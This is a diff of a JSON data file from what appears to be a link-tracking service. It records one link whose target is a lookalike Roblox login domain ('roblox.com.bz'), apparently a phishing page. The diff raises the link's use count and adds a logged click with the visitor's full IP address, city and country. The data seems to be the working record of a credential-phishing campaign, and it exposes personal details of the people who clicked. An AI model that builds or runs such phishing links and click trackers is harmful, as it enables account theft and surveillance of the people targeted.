@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 8,
+    "useCount": 9,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14227,6 +14227,14 @@
         "city": "Beirut",
         "flag": "🇱🇧",
         "countryCode": "LB"
+      },
+      {
+        "timestamp": 1778711321141,
+        "ip": "186.53.225.62",
+        "country": "Uruguay",
+        "city": "Montevideo",
+        "flag": "🇺🇾",
+        "countryCode": "UY"
       }
     ]
   }
